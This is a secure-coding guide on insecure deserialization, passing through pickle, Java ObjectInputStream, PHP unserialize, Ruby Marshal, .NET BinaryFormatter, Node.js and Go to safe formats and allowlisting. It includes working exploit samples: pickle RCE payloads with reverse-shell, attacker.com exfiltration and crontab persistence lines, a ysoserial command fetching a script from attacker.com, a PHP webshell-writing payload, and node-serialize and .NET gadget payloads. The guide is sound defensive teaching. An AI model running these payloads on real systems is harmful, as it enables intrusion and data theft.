# Deserialization Safety

> **Domain:** Security > Secure Coding > Deserialization Safety
> **Difficulty:** Advanced
> **Last Updated:** 2026-03-10

## Why It Matters

Insecure deserialization is one of the most dangerous vulnerability classes in software engineering. When an application deserializes untrusted data, it reconstructs objects from an attacker-controlled byte stream. If the serialization format supports arbitrary type instantiation, the attacker controls which classes are instantiated, which methods are invoked during reconstruction, and which data populates the fields. The result is remote code execution, denial of service, authentication bypass, or data tampering -- without requiring any other vulnerability in the application.

This vulnerability class earned its place in the OWASP Top 10 as A8:2017 (Insecure Deserialization). In the 2021 revision, it was merged into A08:2021 (Software and Data Integrity Failures), reflecting its broader relationship with data integrity. The underlying CWE is **CWE-502: Deserialization of Untrusted Data**.

The danger is not theoretical. Insecure deserialization has been the root cause of some of the most consequential breaches in computing history: the 2017 Equifax breach (Apache Struts/OGNL, a deserialization-adjacent flaw), the Jenkins remote code execution chain, the Apache Commons Collections gadget chain that affected hundreds of Java applications, and the .NET BinaryFormatter exploits that led Microsoft to mark it as permanently unsafe. The Log4Shell vulnerability (CVE-2021-44228), while technically a JNDI injection, was triggered through deserialization of log message content.

The core rule is simple: **never deserialize untrusted data using a format that supports arbitrary type instantiation.** Use data-only formats (JSON, Protocol Buffers, MessagePack) with strict schema validation. If native object deserialization is unavoidable, apply type allowlisting, integrity verification, and input size limits.

---

## Table of Contents

1. [What Is Insecure Deserialization (CWE-502)](#1-what-is-insecure-deserialization-cwe-502)
2. [Python pickle](#2-python-pickle)
3. [Java ObjectInputStream](#3-java-objectinputstream)
4. [PHP unserialize()](#4-php-unserialize)
5. [Ruby Marshal.load](#5-ruby-marshalload)
6. [.NET BinaryFormatter](#6-net-binaryformatter)
7. [JavaScript / Node.js](#7-javascript--nodejs)
8. [Go encoding/gob](#8-go-encodinggob)
9. [Safe Serialization Formats](#9-safe-serialization-formats)
10. [Type Allowlisting](#10-type-allowlisting)
11. [Integrity Verification](#11-integrity-verification)
12. [Deserialization Denial of Service](#12-deserialization-denial-of-service)
13. [Protocol Buffers Security](#13-protocol-buffers-security)
14. [Real-World Exploits](#14-real-world-exploits)
15. [Best Practices](#best-practices)
16. [Anti-Patterns](#anti-patterns)
17. [Enforcement Checklist](#enforcement-checklist)

---

## 1. What Is Insecure Deserialization (CWE-502)

**Serialization** converts an in-memory object into a byte stream (or string) for storage or transmission. **Deserialization** reconstructs the object from that byte stream. When the serialization format encodes type information and the deserializer instantiates arbitrary types based on attacker-controlled input, the attacker gains the ability to:

- **Execute arbitrary code** -- by constructing a serialized object graph that triggers method calls during reconstruction (gadget chains).
- **Tamper with application data** -- by modifying serialized fields (prices, roles, permissions) before the application reads them.
- **Escalate privileges** -- by altering identity or role fields in serialized session objects.
- **Cause denial of service** -- by crafting payloads with deeply nested objects, circular references, or massive sizes that exhaust memory or CPU.

### The Gadget Chain Model

A gadget chain is a sequence of existing classes in the application's classpath (or standard library) whose methods are invoked during deserialization. The attacker does not inject new code. Instead, the attacker selects a chain of existing methods that, when composed, perform a dangerous operation. The typical chain follows this structure:

```
Attacker-controlled serialized bytes
    --> Deserializer instantiates Class A (the "kick-off" gadget)
        --> Class A's constructor or readObject() calls Class B's method
            --> Class B's method calls Class C's method
                --> Class C invokes Runtime.exec() or equivalent
                    --> Arbitrary command execution
```

The attacker never writes the code that runs. The attacker selects and arranges existing library code. This is why gadget chains work even in applications that do not contain any obvious vulnerability -- the vulnerability is the act of deserialization itself.

### CWE and OWASP Mapping

| Identifier | Description |
|------------|-------------|
| CWE-502 | Deserialization of Untrusted Data |
| CWE-915 | Improperly Controlled Modification of Dynamically-Determined Object Attributes |
| A08:2021 | Software and Data Integrity Failures (OWASP Top 10 2021) |
| A8:2017 | Insecure Deserialization (OWASP Top 10 2017) |

---

## 2. Python pickle

### The Danger

Python's `pickle` module serializes and deserializes arbitrary Python objects. The `pickle.loads()` function reconstructs objects by invoking the `__reduce__` method, which can return a callable and its arguments. An attacker who controls the pickled byte stream can execute any Python function with arbitrary arguments during deserialization.

**This is not a bug. It is by design.** The pickle documentation explicitly warns: "The pickle module is not secure. Only unpickle data you trust."

### Exploit Demonstration

```python
# DANGEROUS: This demonstrates how pickle.loads() achieves RCE.
# DO NOT use this in production. This is for educational purposes only.

import pickle
import os

class MaliciousPayload:
    """Crafted class whose __reduce__ method returns os.system with a command."""
    def __reduce__(self):
        # When unpickled, Python calls os.system("id")
        # Any function can be substituted: subprocess.call, exec, eval, etc.
        return (os.system, ("id",))

# Serialize the malicious object
payload = pickle.dumps(MaliciousPayload())

# An attacker sends this payload to a server that calls pickle.loads()
# The server executes os.system("id") -- remote code execution achieved
result = pickle.loads(payload)  # Executes: os.system("id")
```

A more sophisticated attacker can construct payloads that:
- Open a reverse shell: `return (os.system, ("bash -i >& /dev/tcp/attacker.com/4444 0>&1",))`
- Exfiltrate data: `return (os.system, ("curl attacker.com/exfil?data=$(cat /etc/passwd)",))`
- Install persistence: `return (os.system, ("echo '* * * * * /tmp/backdoor.sh' | crontab -",))`

### Vulnerable Code

```python
# VULNERABLE: Deserializing untrusted pickle data from any source

import pickle
from flask import Flask, request

app = Flask(__name__)

@app.route("/api/import", methods=["POST"])
def import_data():
    # NEVER DO THIS -- request body is attacker-controlled
    data = pickle.loads(request.data)
    return {"imported": len(data)}

# Also vulnerable: loading pickle from Redis, databases, files, message queues
cached = pickle.loads(redis_client.get("user_session"))  # VULNERABLE
stored = pickle.loads(db_row["serialized_config"])        # VULNERABLE
```

### Safe Alternatives

```python
# SECURE: Use data-only serialization formats

import json
import msgpack
from pydantic import BaseModel

# Option 1: JSON with schema validation (Pydantic)
class UserConfig(BaseModel):
    theme: str
    language: str
    notifications_enabled: bool

@app.route("/api/import", methods=["POST"])
def import_data():
    # JSON cannot execute code. Pydantic validates the schema.
    config = UserConfig.model_validate_json(request.data)
    return {"theme": config.theme}

# Option 2: MessagePack (binary JSON, no code execution)
@app.route("/api/import-binary", methods=["POST"])
def import_binary():
    data = msgpack.unpackb(request.data, raw=False)
    # Validate the deserialized dictionary against expected schema
    config = UserConfig.model_validate(data)
    return {"theme": config.theme}

# Option 3: Protocol Buffers (schema-enforced, no code execution)
# Requires .proto file and code generation -- see Section 13.
```

### If pickle Is Absolutely Required

```python
# RESTRICTED: If you must use pickle (e.g., legacy ML model loading),
# use RestrictedUnpickler to allowlist specific types.

import pickle
import io

ALLOWED_CLASSES = {
    ("numpy", "ndarray"),
    ("numpy", "dtype"),
    ("collections", "OrderedDict"),
}

class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module: str, name: str) -> type:
        if (module, name) not in ALLOWED_CLASSES:
            raise pickle.UnpicklingError(
                f"Deserialization of {module}.{name} is forbidden"
            )
        return super().find_class(module, name)

def safe_pickle_loads(data: bytes) -> object:
    """Load pickle data with strict type allowlisting."""
    return RestrictedUnpickler(io.BytesIO(data)).load()
```

---

## 3. Java ObjectInputStream

### The Danger

Java's `ObjectInputStream.readObject()` deserializes Java objects from a byte stream. During deserialization, the JVM invokes `readObject()`, `readResolve()`, `readExternal()`, and `finalize()` methods on the reconstructed objects. If the classpath contains classes with dangerous side effects in these methods, an attacker can chain them to achieve remote code execution.

The Java deserialization problem is particularly severe because:
- The Java ecosystem has massive classpaths with thousands of classes.
- Libraries like Apache Commons Collections, Spring Framework, Apache Commons BeanUtils, and Groovy contain known gadget chains.
- The tool **ysoserial** automates the generation of exploit payloads for dozens of known gadget chains.

### The ysoserial Attack

```
# ysoserial generates serialized Java objects that exploit known gadget chains.
# The attacker does not need access to the application source code.
# The attacker only needs to know which libraries are on the classpath.

# Generate a payload that exploits Apache Commons Collections 3.x:
java -jar ysoserial.jar CommonsCollections1 "curl http://attacker.com/shell.sh | bash" > payload.bin

# Send the payload to any endpoint that calls ObjectInputStream.readObject():
curl -X POST --data-binary @payload.bin http://target.com/api/import \
  -H "Content-Type: application/x-java-serialized-object"

# The server deserializes the payload, triggers the gadget chain,
# and executes: curl http://attacker.com/shell.sh | bash
```

Known ysoserial gadget chains include:
- **CommonsCollections1-7** -- Apache Commons Collections (the most widely exploited)
- **Spring1-2** -- Spring Framework
- **Groovy1** -- Apache Groovy
- **CommonsBeanutils1** -- Apache Commons BeanUtils
- **Hibernate1-2** -- Hibernate ORM
- **JBossInterceptors1** -- JBoss/WildFly
- **Jdk7u21** -- JDK itself (no third-party libraries needed)

### Vulnerable Code

```java
// VULNERABLE: Deserializing untrusted data with ObjectInputStream

import java.io.ObjectInputStream;
import javax.servlet.http.HttpServletRequest;

public class ImportServlet extends HttpServlet {
    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response)
            throws IOException, ClassNotFoundException {
        // NEVER DO THIS -- request body is attacker-controlled
        ObjectInputStream ois = new ObjectInputStream(request.getInputStream());
        Object data = ois.readObject();  // RCE if gadget chain is on classpath
        processData(data);
    }
}
```

### Safe Alternatives

```java
// SECURE Option 1: Use Jackson JSON with restricted type handling

import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.json.JsonMapper;
import com.fasterxml.jackson.databind.jsontype.BasicPolymorphicTypeValidator;

// Configure Jackson to reject all polymorphic deserialization except explicit allowlist
BasicPolymorphicTypeValidator validator = BasicPolymorphicTypeValidator.builder()
    .allowIfSubType("com.myapp.dto.")  // Only allow classes in your DTO package
    .denyForExactBaseType(Object.class)
    .build();

ObjectMapper mapper = JsonMapper.builder()
    .activateDefaultTyping(validator, ObjectMapper.DefaultTyping.NON_FINAL)
    .build();

// Deserialize JSON to a specific, known type -- no arbitrary class instantiation
UserDTO user = mapper.readValue(jsonString, UserDTO.class);
```

```java
// SECURE Option 2: Use Protocol Buffers (no arbitrary type instantiation)

// user.proto:
// syntax = "proto3";
// message UserDTO {
//     string name = 1;
//     string email = 2;
//     int32 age = 3;
// }

// Generated Java code provides a safe parser:
UserDTO user = UserDTO.parseFrom(requestBytes);
// Protobuf cannot instantiate arbitrary classes. Only fields defined in the .proto
// schema are populated. No methods are invoked during deserialization.
```

```java
// SECURE Option 3: If ObjectInputStream is unavoidable, use ObjectInputFilter (Java 9+)

import java.io.ObjectInputFilter;
import java.io.ObjectInputStream;

public Object safeDeserialize(InputStream input) throws IOException, ClassNotFoundException {
    ObjectInputStream ois = new ObjectInputStream(input);

    // Define a strict filter that allowlists specific classes
    ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
        "com.myapp.dto.UserDTO;"
        + "com.myapp.dto.OrderDTO;"
        + "java.lang.String;"
        + "java.lang.Integer;"
        + "java.util.ArrayList;"
        + "!*"  // Deny everything not explicitly allowed
    );
    ois.setObjectInputFilter(filter);

    return ois.readObject();
}
```

---

## 4. PHP unserialize()

### The Danger

PHP's `unserialize()` function reconstructs PHP objects from a serialized string. During reconstruction, PHP invokes magic methods: `__wakeup()` (called immediately after deserialization), `__destruct()` (called when the object is garbage collected), `__toString()` (called when the object is used in a string context), and others. An attacker who controls the serialized string can instantiate any class loaded in the application and trigger these magic methods.

**POP (Property-Oriented Programming) chains** are the PHP equivalent of Java gadget chains. The attacker selects existing classes in the application or its dependencies whose magic methods, when chained, achieve code execution.

### Exploit Demonstration

```php
// DANGEROUS: Demonstrates how unserialize() achieves RCE via __destruct()

class FileLogger {
    public $logFile;
    public $logData;

    public function __destruct() {
        // Intended to flush remaining log data to disk on shutdown
        file_put_contents($this->logFile, $this->logData, FILE_APPEND);
    }
}

// Attacker crafts a serialized FileLogger with controlled properties:
// logFile = "/var/www/html/shell.php"
// logData = "<?php system($_GET['cmd']); ?>"
$payload = 'O:10:"FileLogger":2:{s:7:"logFile";s:26:"/var/www/html/shell.php";s:7:"logData";s:34:"<?php system($_GET[\'cmd\']); ?>";}';

// When the application calls unserialize($payload):
// 1. PHP creates a FileLogger object with attacker-controlled properties
// 2. When the script ends, PHP garbage-collects the object
// 3. __destruct() fires, writing a PHP webshell to the web root
// 4. Attacker visits /shell.php?cmd=id -- remote code execution achieved
$obj = unserialize($payload);  // Writes a webshell when $obj is destroyed
```

### Vulnerable Code

```php
// VULNERABLE: Deserializing untrusted data with unserialize()

// Session data from cookie
$session = unserialize($_COOKIE['session_data']);  // NEVER DO THIS

// User preferences from database
$prefs = unserialize($row['preferences']);  // VULNERABLE if DB data is attacker-influenced

// API payload
$data = unserialize(file_get_contents('php://input'));  // NEVER DO THIS
```

### Safe Alternatives

```php
// SECURE: Use json_decode() instead of unserialize()

// Option 1: JSON for all data interchange
$data = json_decode($request->getContent(), true, 512, JSON_THROW_ON_ERROR);
// json_decode() returns arrays and scalars. It CANNOT instantiate objects,
// invoke methods, or execute code.

// Validate the decoded data against expected schema
if (!isset($data['theme']) || !is_string($data['theme'])) {
    throw new InvalidArgumentException("Invalid preferences format");
}

// Option 2: If you must accept serialized PHP data, use allowed_classes restriction (PHP 7.0+)
$data = unserialize($serialized, [
    'allowed_classes' => false,  // Convert ALL objects to __PHP_Incomplete_Class
]);
// Objects become inert -- no magic methods are invoked

// Option 3: Allowlist specific classes (only if absolutely necessary)
$data = unserialize($serialized, [
    'allowed_classes' => ['MyApp\\DTO\\UserPreferences'],
]);
// Only UserPreferences can be instantiated. All other classes are blocked.
```

### Critical Rule

**Never call `unserialize()` on user-supplied data.** The `allowed_classes` restriction mitigates the risk but does not eliminate it entirely. An allowed class might still have exploitable magic methods. The only fully safe approach is to use `json_decode()` or another data-only format.

---

## 5. Ruby Marshal.load

### The Danger

Ruby's `Marshal.load` is functionally equivalent to Python's `pickle.loads()`. It deserializes arbitrary Ruby objects, including their class types and instance variables. During deserialization, Ruby can invoke `initialize`, `marshal_load`, and other methods on the reconstructed objects. An attacker who controls the marshaled byte stream can achieve remote code execution.

The Ruby on Rails framework has experienced multiple deserialization vulnerabilities, including CVE-2013-0156 (XML parameter parsing triggering Marshal.load) which allowed unauthenticated remote code execution on any Rails application.

### Exploit Demonstration

```ruby
# DANGEROUS: Demonstrates how Marshal.load achieves RCE

require 'erb'

# ERB templates execute Ruby code when result() is called.
# Marshal can serialize an ERB object with attacker-controlled template source.
# When the application interacts with the deserialized ERB object, code executes.

# Attacker crafts a marshaled payload:
payload = Marshal.dump(ERB.new("<%= `id` %>"))

# When the application calls Marshal.load and later uses the object:
obj = Marshal.load(payload)
obj.result  # Executes: `id` (backtick shell execution)
```

### Vulnerable Code

```ruby
# VULNERABLE: Deserializing untrusted data with Marshal.load

# From HTTP request
data = Marshal.load(request.body.read)  # NEVER DO THIS

# From Redis cache
session = Marshal.load(Redis.current.get("session:#{session_id}"))  # VULNERABLE

# From cookie (Rails default cookie serializer was Marshal until Rails 5.2)
# Rails < 5.2 used Marshal for cookie serialization by default
```

### Safe Alternatives

```ruby
# SECURE: Use JSON for all data interchange

require 'json'
require 'json_schemer'

# Option 1: JSON with schema validation
schema = JSONSchemer.schema({
  "type" => "object",
  "properties" => {
    "theme" => { "type" => "string", "enum" => ["light", "dark"] },
    "language" => { "type" => "string", "pattern" => "^[a-z]{2}$" },
    "notifications" => { "type" => "boolean" }
  },
  "required" => ["theme", "language"],
  "additionalProperties" => false
})

data = JSON.parse(request.body.read)
unless schema.valid?(data)
  halt 400, { error: "Invalid data format" }.to_json
end

# Option 2: MessagePack (binary, no code execution)
require 'msgpack'
data = MessagePack.unpack(request.body.read)

# Option 3: Rails -- ensure cookie serializer is JSON (Rails 5.2+ default)
# config/initializers/cookies_serializer.rb
Rails.application.config.action_dispatch.cookies_serializer = :json
```

---

## 6. .NET BinaryFormatter

### The Danger

The .NET `BinaryFormatter` is the most dangerous serializer in the .NET ecosystem. Microsoft has officially marked it as **permanently unsafe** and recommends against its use in any scenario. Starting with .NET 5, `BinaryFormatter.Deserialize` throws a `NotSupportedException` by default in ASP.NET apps. In .NET 9+, it is completely removed.

`BinaryFormatter` encodes full type information in the serialized stream. An attacker can specify any type in the .NET Framework or loaded assemblies. Known gadget chains exploit `TypeConfuseDelegate`, `WindowsIdentity`, `ClaimsIdentity`, `DataSet`, and other framework types to achieve remote code execution.

Additionally, Newtonsoft.Json (Json.NET) with `TypeNameHandling` set to anything other than `None` is vulnerable to the same class of attacks. When `TypeNameHandling.Auto`, `TypeNameHandling.All`, or `TypeNameHandling.Objects` is enabled, the JSON payload can specify a `$type` property that controls which .NET type is instantiated.

### Vulnerable Code

```csharp
// VULNERABLE: BinaryFormatter -- NEVER use this for any purpose

using System.Runtime.Serialization.Formatters.Binary;

public object DeserializeData(byte[] data)
{
    // NEVER DO THIS -- Microsoft explicitly marks BinaryFormatter as dangerous
    var formatter = new BinaryFormatter();
    using var stream = new MemoryStream(data);
    return formatter.Deserialize(stream);  // RCE if attacker controls data
}
```

```csharp
// VULNERABLE: Newtonsoft.Json with TypeNameHandling enabled

using Newtonsoft.Json;

var settings = new JsonSerializerSettings
{
    // NEVER DO THIS -- allows attacker to specify arbitrary .NET types in JSON
    TypeNameHandling = TypeNameHandling.Auto
};

// Attacker sends JSON:
// {
//   "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
//   "MethodName": "Start",
//   "ObjectInstance": {
//     "$type": "System.Diagnostics.Process, System",
//     "StartInfo": {
//       "FileName": "cmd.exe",
//       "Arguments": "/c calc.exe"
//     }
//   }
// }
var obj = JsonConvert.DeserializeObject<object>(jsonString, settings);
```

### Safe Alternatives

```csharp
// SECURE Option 1: System.Text.Json (no type name handling by default)

using System.Text.Json;

public record UserDTO(string Name, string Email, int Age);

public UserDTO DeserializeUser(string json)
{
    // System.Text.Json deserializes to the specified type only.
    // It does not support TypeNameHandling. No arbitrary type instantiation.
    return JsonSerializer.Deserialize<UserDTO>(json, new JsonSerializerOptions
    {
        PropertyNameCaseInsensitive = true,
        // Reject unknown properties to enforce strict schema
        UnmappedMemberHandling = System.Text.Json.Serialization.JsonUnmappedMemberHandling.Disallow
    }) ?? throw new JsonException("Deserialization returned null");
}
```

```csharp
// SECURE Option 2: Newtonsoft.Json with TypeNameHandling.None (the default)

using Newtonsoft.Json;

var settings = new JsonSerializerSettings
{
    TypeNameHandling = TypeNameHandling.None,  // This is the default -- be explicit
    MaxDepth = 32  // Prevent deeply nested object DoS
};

var user = JsonConvert.DeserializeObject<UserDTO>(jsonString, settings);
```

```csharp
// SECURE Option 3: Protocol Buffers via Google.Protobuf

// user.proto:
// syntax = "proto3";
// message UserDTO {
//     string name = 1;
//     string email = 2;
//     int32 age = 3;
// }

using Google.Protobuf;

public UserDTO DeserializeUser(byte[] data)
{
    return UserDTO.Parser.ParseFrom(data);
    // Protobuf only populates fields defined in the schema.
    // No arbitrary type instantiation. No method invocation.
}
```

### If Polymorphic Deserialization Is Required in Newtonsoft.Json

```csharp
// RESTRICTED: If TypeNameHandling is genuinely needed, use a custom SerializationBinder

using Newtonsoft.Json;
using Newtonsoft.Json.Serialization;

public class AllowlistSerializationBinder : ISerializationBinder
{
    private readonly HashSet<string> _allowedTypes = new()
    {
        typeof(UserDTO).AssemblyQualifiedName!,
        typeof(OrderDTO).AssemblyQualifiedName!,
        typeof(List<UserDTO>).AssemblyQualifiedName!,
    };

    public Type BindToType(string? assemblyName, string typeName)
    {
        var fullName = $"{typeName}, {assemblyName}";
        if (!_allowedTypes.Contains(fullName))
        {
            throw new JsonSerializationException(
                $"Type '{fullName}' is not allowed for deserialization");
        }
        return Type.GetType(fullName)
            ?? throw new JsonSerializationException($"Type '{fullName}' not found");
    }

    public void BindToName(Type serializedType, out string? assemblyName, out string? typeName)
    {
        assemblyName = serializedType.Assembly.FullName;
        typeName = serializedType.FullName;
    }
}

var settings = new JsonSerializerSettings
{
    TypeNameHandling = TypeNameHandling.Auto,
    SerializationBinder = new AllowlistSerializationBinder(),
    MaxDepth = 32
};
```

---

## 7. JavaScript / Node.js

### The Danger

JavaScript does not have a native binary serialization format equivalent to Java's `ObjectInputStream` or Python's `pickle`. However, the Node.js ecosystem has introduced its own deserialization risks:

1. **node-serialize RCE** -- The `node-serialize` npm package supports serializing JavaScript functions. An attacker can embed an Immediately Invoked Function Expression (IIFE) in the serialized data to achieve code execution during deserialization.
2. **Prototype pollution** -- While not strictly deserialization, `JSON.parse()` combined with recursive object merge (lodash `merge`, `deepExtend`, manual property assignment) can be exploited to modify `Object.prototype`, affecting all objects in the application.

### node-serialize Exploit

```javascript
// DANGEROUS: node-serialize executes functions during deserialization

const serialize = require("node-serialize");

// Attacker crafts a serialized payload with an IIFE:
const maliciousPayload = '{"exploit":"_$$ND_FUNC$$_function(){require(\'child_process\').execSync(\'id\')}()"}';

// When the application deserializes this payload:
const obj = serialize.unserialize(maliciousPayload);
// The IIFE executes immediately during deserialization.
// require('child_process').execSync('id') runs -- RCE achieved.
```

### Prototype Pollution

```javascript
// VULNERABLE: Recursive merge allows prototype pollution

function deepMerge(target, source) {
    for (const key in source) {
        if (typeof source[key] === "object" && source[key] !== null) {
            if (!target[key]) target[key] = {};
            deepMerge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}

// Attacker sends JSON body:
// { "__proto__": { "isAdmin": true } }
const userInput = JSON.parse('{"__proto__":{"isAdmin":true}}');
const config = {};
deepMerge(config, userInput);

// Now EVERY object in the application has isAdmin === true:
const newObj = {};
console.log(newObj.isAdmin);  // true -- prototype polluted
```

### Safe Alternatives

```javascript
// SECURE: Use JSON.parse() (safe by itself) with schema validation

import { z } from "zod";

const UserConfigSchema = z.object({
    theme: z.enum(["light", "dark"]),
    language: z.string().regex(/^[a-z]{2}$/),
    notifications: z.boolean(),
});

app.post("/api/config", (req, res) => {
    // JSON.parse is safe -- it cannot execute code or instantiate classes.
    // Validation ensures the parsed data matches the expected schema.
    const parsed = UserConfigSchema.safeParse(req.body);
    if (!parsed.success) {
        return res.status(400).json({ error: parsed.error.issues });
    }
    updateConfig(parsed.data);
    res.json({ success: true });
});
```

```javascript
// SECURE: Prevent prototype pollution in object merging

// Option 1: Use Object.create(null) for merge targets (no prototype)
function safeMerge(target, source) {
    const result = Object.create(null);
    for (const key of Object.keys(source)) {
        // Block __proto__, constructor, and prototype keys
        if (key === "__proto__" || key === "constructor" || key === "prototype") {
            continue;
        }
        if (typeof source[key] === "object" && source[key] !== null && !Array.isArray(source[key])) {
            result[key] = safeMerge(target?.[key] ?? {}, source[key]);
        } else {
            result[key] = source[key];
        }
    }
    return result;
}

// Option 2: Use structuredClone() (no prototype pollution risk)
const safeData = structuredClone(JSON.parse(requestBody));

// Option 3: Never use node-serialize, funcster, or any package that serializes functions.
// Use JSON.stringify / JSON.parse for all serialization needs.
```

---

## 8. Go encoding/gob

### The Danger

Go's `encoding/gob` package is safer than most language-native serializers because Go is statically typed and does not have the same magic method / reflection-based instantiation risks as Java, Python, or PHP. However, there are still security considerations:

1. **interface{} / any deserialization** -- If gob decodes into an `interface{}` field, the decoded type must have been registered with `gob.Register()`. An attacker cannot instantiate arbitrary types unless they are registered. However, registering too many types expands the attack surface.
2. **Resource exhaustion** -- Malformed gob data can cause excessive memory allocation or CPU consumption during decoding.
3. **Type confusion** -- If the application uses `encoding/gob` with `interface{}` fields and registers types broadly, an attacker might substitute one type for another.

### Safe Code

```go
// SECURE: Decode into specific, known struct types -- not interface{}

package main

import (
    "bytes"
    "encoding/gob"
    "fmt"
    "io"
)

type UserConfig struct {
    Theme    string
    Language string
    Notify   bool
}

func decodeUserConfig(data []byte) (*UserConfig, error) {
    // Decode into a specific struct -- no arbitrary type instantiation
    var config UserConfig
    decoder := gob.NewDecoder(bytes.NewReader(data))
    if err := decoder.Decode(&config); err != nil {
        return nil, fmt.Errorf("failed to decode config: %w", err)
    }
    return &config, nil
}

// PREFERRED: Use encoding/json or protobuf instead of gob for untrusted data

import "encoding/json"

func decodeUserConfigJSON(data []byte) (*UserConfig, error) {
    var config UserConfig
    decoder := json.NewDecoder(bytes.NewReader(data))
    decoder.DisallowUnknownFields()  // Reject unexpected fields
    if err := decoder.Decode(&config); err != nil {
        return nil, fmt.Errorf("failed to decode config: %w", err)
    }
    return &config, nil
}
```

```go
// SECURE: Limit gob decoding resource consumption

func decodeLimited(r io.Reader, maxSize int64, target interface{}) error {
    // Limit the input size to prevent memory exhaustion
    limitedReader := io.LimitReader(r, maxSize)
    decoder := gob.NewDecoder(limitedReader)
    return decoder.Decode(target)
}
```

### Go Recommendations

- Prefer `encoding/json` or Protocol Buffers over `encoding/gob` for untrusted input.
- Never decode gob data into `interface{}` or `any` fields from untrusted sources.
- Limit the size of input data before decoding.
- Use `json.Decoder.DisallowUnknownFields()` to enforce strict schema compliance.

---

## 9. Safe Serialization Formats

The following formats are safe by design because they serialize data values only. They do not encode type information that triggers class instantiation or method invocation during deserialization.

### Format Comparison Table

| Format | Type Safety | Schema Enforcement | Binary | Human Readable | Code Execution Risk |
|--------|-------------|-------------------|--------|----------------|-------------------|
| JSON | Weak (string, number, bool, null, array, object) | External (JSON Schema, Zod, Pydantic) | No | Yes | None (data only) |
| Protocol Buffers | Strong (typed fields, generated code) | Built-in (.proto schema) | Yes | No | None (data only) |
| MessagePack | Weak (similar to JSON) | External | Yes | No | None (data only) |
| Apache Avro | Strong (typed fields, schema registry) | Built-in (.avsc schema) | Yes | No | None (data only) |
| FlatBuffers | Strong (typed fields, zero-copy) | Built-in (.fbs schema) | Yes | No | None (data only) |
| CBOR | Weak (similar to JSON) | External | Yes | No | None (data only) |
| pickle (Python) | Arbitrary types | None | Yes | No | **Critical -- RCE** |
| Java Serialization | Arbitrary types | None | Yes | No | **Critical -- RCE** |
| Marshal (Ruby) | Arbitrary types | None | Yes | No | **Critical -- RCE** |
| BinaryFormatter (.NET) | Arbitrary types | None | Yes | No | **Critical -- RCE** |
| PHP serialize() | Arbitrary types | None | No | Partially | **Critical -- RCE** |

### Format Selection Decision

```
Is the data crossing a trust boundary (network, file, queue, database)?
    |
    Yes --> Use a data-only format:
    |       |
    |       Need schema enforcement? --> Protocol Buffers, Avro, FlatBuffers
    |       |
    |       Need human readability? --> JSON (with schema validation)
    |       |
    |       Need compact binary? --> MessagePack, CBOR
    |
    No (same process, same trust level) --> Any format is acceptable,
        but data-only formats are still preferred for defense in depth.
```

### JSON with Schema Validation

```typescript
// JSON is safe because it only encodes primitives (strings, numbers, booleans,
// null) and structures (arrays, objects). It cannot encode types, classes,
// or functions. Always validate the parsed JSON against a schema.

import { z } from "zod";

const OrderSchema = z.object({
    orderId: z.string().uuid(),
    items: z.array(z.object({
        productId: z.string().uuid(),
        quantity: z.number().int().positive().max(1000),
        unitPrice: z.number().positive().max(999999),
    })).min(1).max(100),
    currency: z.enum(["USD", "EUR", "GBP"]),
});

type Order = z.infer<typeof OrderSchema>;

function parseOrder(json: string): Order {
    const raw = JSON.parse(json);
    return OrderSchema.parse(raw);  // Throws ZodError if invalid
}
```

---

## 10. Type Allowlisting

When native object deserialization is unavoidable (legacy systems, ML model loading, inter-service communication in a trusted network), restrict the types that can be deserialized to a strict allowlist.

### Java ObjectInputFilter (Java 9+)

```java
// Java 9+ provides ObjectInputFilter for fine-grained deserialization control.

import java.io.ObjectInputFilter;
import java.io.ObjectInputStream;
import java.io.InputStream;

public class SafeDeserializer {

    // Define the filter as a static constant
    private static final ObjectInputFilter FILTER = ObjectInputFilter.Config.createFilter(
        // Allow specific application DTO classes
        "com.myapp.dto.UserDTO;"
        + "com.myapp.dto.OrderDTO;"
        + "com.myapp.dto.ProductDTO;"
        // Allow essential JDK types
        + "java.lang.String;"
        + "java.lang.Integer;"
        + "java.lang.Long;"
        + "java.lang.Boolean;"
        + "java.util.ArrayList;"
        + "java.util.HashMap;"
        + "java.util.LinkedList;"
        // Set resource limits
        + "maxdepth=10;"     // Maximum object nesting depth
        + "maxrefs=1000;"    // Maximum number of internal references
        + "maxbytes=100000;" // Maximum byte stream size (100 KB)
        + "maxarray=1000;"   // Maximum array length
        // Deny everything else
        + "!*"
    );

    public static Object deserialize(InputStream input) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(input);
        ois.setObjectInputFilter(FILTER);
        return ois.readObject();
    }
}
```

```java
// Java 17+ provides a process-wide deserialization filter via system property:
// -Djdk.serialFilter=com.myapp.dto.*;java.lang.*;java.util.*;!*

// Or set programmatically at application startup:
ObjectInputFilter.Config.setSerialFilter(
    ObjectInputFilter.Config.createFilter(
        "com.myapp.dto.*;java.lang.*;java.util.*;maxdepth=10;!*"
    )
);
```

### Python RestrictedUnpickler

```python
# Restrict pickle to a strict allowlist of types (repeated here for completeness)

import pickle
import io
from typing import Any

class StrictUnpickler(pickle.Unpickler):
    """Unpickler that only allows explicitly permitted types."""

    ALLOWED = {
        # Only allow these specific (module, class) pairs
        ("builtins", "dict"),
        ("builtins", "list"),
        ("builtins", "tuple"),
        ("builtins", "set"),
        ("builtins", "frozenset"),
        ("builtins", "str"),
        ("builtins", "int"),
        ("builtins", "float"),
        ("builtins", "bool"),
        ("builtins", "bytes"),
        ("builtins", "complex"),
        ("datetime", "datetime"),
        ("datetime", "date"),
        ("datetime", "time"),
        ("decimal", "Decimal"),
        ("collections", "OrderedDict"),
    }

    def find_class(self, module: str, name: str) -> type:
        key = (module, name)
        if key not in self.ALLOWED:
            raise pickle.UnpicklingError(
                f"Deserialization of {module}.{name} is blocked. "
                f"Only types in the allowlist are permitted."
            )
        return super().find_class(module, name)

def restricted_loads(data: bytes) -> Any:
    return StrictUnpickler(io.BytesIO(data)).load()
```

### .NET AllowlistSerializationBinder

See the implementation in [Section 6](#6-net-binaryformatter) above. The key principle is the same: maintain an explicit set of permitted types and reject everything else.

### Key Principles for Type Allowlisting

1. **Deny by default** -- the filter must reject any type not explicitly listed.
2. **Allowlist application DTOs only** -- do not allowlist framework classes, collection implementations with complex constructors, or reflection-capable types.
3. **Set resource limits** -- maximum depth, maximum references, maximum byte size, maximum array length.
4. **Audit the allowlist regularly** -- ensure no newly added allowed type introduces a gadget chain.
